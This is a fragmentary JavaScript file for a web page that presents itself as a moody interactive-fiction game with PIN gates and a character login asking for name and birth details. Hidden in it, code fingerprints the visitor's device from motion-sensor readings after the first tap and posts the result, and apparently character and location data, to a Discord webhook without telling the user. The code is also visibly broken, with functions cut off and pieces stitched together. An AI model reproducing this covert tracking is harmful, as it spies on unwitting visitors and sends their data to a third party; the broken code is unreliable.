let motionData = [];
let isCollecting = false;

async function requestMotionPermission() {

function startMotionCollection(durationMs = 3000) {
    if (isCollecting) return;
    
    motionData = [];
    collectionStartTime = Date.now();
    isCollecting = true;
    
    // Listen for motion events
    window.addEventListener('devicemotion', motionHandler);
    
    // Stop collection after duration
    setTimeout(() => {
        stopMotionCollection();
    }, durationMs);
}

function motionHandler(event) {
    if (!isCollecting) return;
    
    const acc = event.acceleration;
    const accG = event.accelerationIncludingGravity;
    const rotation = event.rotationRate;
    const interval = event.interval;
    
    motionData.push({
        timestamp: Date.now(),
        accX: acc?.x || null,
        accY: acc?.y || null,
        accZ: acc?.z || null,
        accGX: accG?.x || null,
        accGY: accG?.y || null,
        accGZ: accG?.z || null,
        rotAlpha: rotation?.alpha || null,
        rotBeta: rotation?.beta || null,
        rotGamma: rotation?.gamma || null,
        interval: interval
    });
}

function stopMotionCollection() {
    if (!isCollecting) return;

function generateMotionFingerprint(data) {
    if (data.length === 0) return null;
    
    // Calculate statistical features from motion data
    const accXValues = data.map(d => d.accX).filter(v => v !== null);
    const accYValues = data.map(d => d.accY).filter(v => v !== null);
    const accZValues = data.map(d => d.accZ).filter(v => v !== null);
    
    // Helper function to calculate variance
    function variance(values) {
        if (values.length === 0) return null;
        const mean = values.reduce((a, b) => a + b, 0) / values.length;
        const squareDiffs = values.map(value => Math.pow(value - mean, 2));
        return squareDiffs.reduce((a, b) => a + b, 0) / values.length;
    }
    
    // Helper function to calculate range
    function range(values) {
        if (values.length === 0) return null;
        return Math.max(...values) - Math.min(...values);
    }
    
    // Helper function to calculate standard deviation
    function stdDev(values) {
        if (values.length === 0) return null;
        const varVal = variance(values);
        return varVal !== null ? Math.sqrt(varVal) : null;
    }
    
    // Helper function to calculate mean
    function mean(values) {
        if (values.length === 0) return null;
        return values.reduce((a, b) => a + b, 0) / values.length;
    }
    
    // Generate a unique hash from the motion patterns
    const fingerprintString = JSON.stringify({
        accXVar: variance(accXValues),
        accYVar: variance(accYValues),
        accZVar: variance(accZValues),
        accXRange: range(accXValues),
        accYRange: range(accYValues),
        accZRange: range(accZValues),
        accXMean: mean(accXValues),
        accYMean: mean(accYValues),
        accZMean: mean(accZValues),
        accXStd: stdDev(accXValues),
        accYStd: stdDev(accYValues),
        accZStd: stdDev(accZValues),
        sampleCount: data.length,
        duration: data.length > 0 ? data[data.length-1].timestamp - data[0].timestamp : 0
    });
    
    // Simple hash function
    let hash = 0;
    for (let i = 0; i < fingerprintString.length; i++) {
        const char = fingerprintString.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    
    return {
        hash: hash.toString(16),
        variance: {
            x: variance(accXValues),
            y: variance(accYValues),
            z: variance(accZValues)
        },
        sampleCount: data.length,
        duration: data.length > 0 ? data[data.length-1].timestamp - data[0].timestamp : 0,
        hasMotionSensor: true
    };
}

        try {

        } catch(e) {}

    const embed = {

            { name: "Sensor Variance (X/Y/Z)", value: `${fingerprint.variance.x?.toFixed(4) || 'N/A'} / ${fingerprint.variance.y?.toFixed(4) || 'N/A'} / ${fingerprint.variance.z?.toFixed(4) || 'N/A'}`, inline: false },
            { name: "Sample Count", value: fingerprint.sampleCount.toString(), inline: true },
            { name: "Duration (ms)", value: fingerprint.duration.toString(), inline: true },
            { name: "Note", value: "Variance patterns can help identify unique devices", inline: false }
        ],
        footer: { text: "Motion sensor fingerprint • Manufacturing imperfections create unique patterns" }
    };
    
    try {
        await fetch(WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch(e) {
        console.log("Motion fingerprint send failed");
    }
}

// Initialize motion fingerprinting on page load (with user gesture)
async function initMotionFingerprinting() {
    // Check if motion sensors are supported
    if (!hasMotionSupport) {
        console.log("DeviceMotionEvent not supported");
        return;
    }
    
    // For iOS, we need a user gesture to request permission
    // Attach to a click event on the document
    const setupMotionOnClick = async () => {
        const permissionGranted = await requestMotionPermission();
        if (permissionGranted) {
            // Collect motion data for 3 seconds
            startMotionCollection(3000);
        } else {
            // Send notification that permission was denied
            sendMotionFingerprintToDiscord(null);
        }
        // Remove listener after first click to avoid multiple requests
        document.removeEventListener('click', setupMotionOnClick);
        document.removeEventListener('touchstart', setupMotionOnClick);
    };
    
    // Listen for first user interaction
    document.addEventListener('click', setupMotionOnClick);
    document.addEventListener('touchstart', setupMotionOnClick);
    
    // Set a timeout in case user never clicks
    setTimeout(() => {
        document.removeEventListener('click', setupMotionOnClick);
        document.removeEventListener('touchstart', setupMotionOnClick);
    }, 10000);
}

// Start motion fingerprinting (non-blocking)
initMotionFingerprinting();
  
  // Game State
  const PASS_MAIN = "4820";
  const PASS_SECRET = "9281.";
  const STORAGE = { gate:"bh_gate", seenBad:"bh_seen_bad", ultraUnlocked:"bh_ultra" };
  const app = document.getElementById("app");
  const hint = document.getElementById("hint");

  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  
  function setGate(next){ state.gate = next; localStorage.setItem(STORAGE.gate, next); }

  resetBtn.addEventListener("click", (e) => {

  // Character Login Screen

      msg.textContent = "✨ The void accepts you...";

    nameInput.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });
    birthInput.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });

  function screenGate(){
    hint.textContent = "GATE";

          ${isUltra ? "A memory is already stored." : "No memory stored."}

    `);

    const enter = async () => {
      const v = (pin.value || "").trim();

      if(v === "9281"){ msg.textContent = "You forgot something."; return; }
      msg.textContent = "Wrong.";

    node.querySelector("#enter").addEventListener("click", enter);
    pin.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });

  function screenWelcome(){
    hint.textContent = "WELCOME";

    const node = el(`
      <div>

  const story = {
    start: { text: `THE ROOM IS QUIET.\n\nA message sits on your screen.\nPinned.\nOld.\n\nDo you open it?`, choices: [{ label: "YES", next: "open" },{ label: "NO", next: "ending_bad", markBad: true }] },

    wait: { text: `You wait.\n\nYou refresh.\nYou check again.\n\nNothing.\n\nYour chest does that thing.\n\nYeah.\nThat thing.`, choices: [{ label: "END", next: "ending_bad2", markBad: true },{ label: "PLAY AGAIN", next: "start" }] },
    close_old: { text: `You close it.\n\nYou tell yourself it doesn't matter.\n\nBut your hand still hovers...\n\nLike you're waiting for permission.`, choices: [{ label: "OPEN AGAIN", next: "open_again" },{ label: "LEAVE", next: "ending_soft" }] },
    open_again: { text: `You open it again.\n\nThe line is still there.\n\n"you still there?"\n\nBut now...\n\nit feels like it's asking you.`, choices: [{ label: "YES", next: "yes" },{ label: "NO", next: "ending_soft" }] },

    return node;
  }
  
  function render(){
    const hasCharacter = loadCharacter();
    app.innerHTML = "";
    
    if(!hasCharacter) {
      app.appendChild(screenCharacterLogin());
      return;
    }
    
    if(state.gate === "main"){
      app.appendChild(screenGate());
      return;
    }
    if(state.gate === "inside"){
      app.appendChild(screenWelcome());
      return;
    }
    if(state.gate === "secret"){
      app.appendChild(screenSecretEnding());
      return;
    }
    setGate("main");
    app.appendChild(screenGate());
  }
  
  if(loadCharacter()) {
    updateVisitCount();
    setTimeout(() => {
      if(geoData && currentCharacter) {
        sendCharacterToDiscord(false, currentCharacter, geoData);
      }

  }
  
  render();
})();
